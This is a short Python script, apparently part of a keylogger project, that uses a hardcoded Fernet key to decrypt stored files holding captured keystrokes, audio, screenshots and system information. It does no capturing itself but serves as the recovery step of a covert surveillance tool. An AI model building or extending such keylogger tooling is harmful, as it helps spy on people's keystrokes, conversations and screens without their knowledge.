from cryptography.fernet import Fernet
import os
import getpass

# Constants
username = getpass.getuser()
file_path = os.path.join("C:\\Users", username, "Documents", "Projects", "KeyLogger")
key = b"RpAJlSa_CGXhwtDSjnRvX-YesCOOJomns6tA2jN459s="  # Same key used during encryption

# Encrypted File Names
encrypted_file_names = {
    "system_info": "e_system.txt",
    "audio": "e_audio.txt",
    "screenshot": "e_screenshot.txt",
    "key_log": "e_key.txt",
}

# Original (decrypted) File Names
original_file_names = {
    "system_info": "system_info.txt",
    "audio": "audio.wav",
    "screenshot": "screenshot.png",
    "key_log": "key_log.txt",
}

# Decryption Logic
def decrypt_files():
    fernet = Fernet(key)

    for enc_file, orig_file in zip(encrypted_file_names.values(), original_file_names.values()):
        enc_file_path = os.path.join(file_path, enc_file)
        orig_file_path = os.path.join(file_path, orig_file)
        
        # Read the encrypted data
        with open(enc_file_path, 'rb') as f:
            encrypted_data = f.read()
        
        # Decrypt the data
        decrypted_data = fernet.decrypt(encrypted_data)
        
        # Write the decrypted data back to the original file
        with open(orig_file_path, 'wb') as f:
            f.write(decrypted_data)
        
        print(f"{orig_file} decrypted successfully!")

# Call the decryption function
decrypt_files()
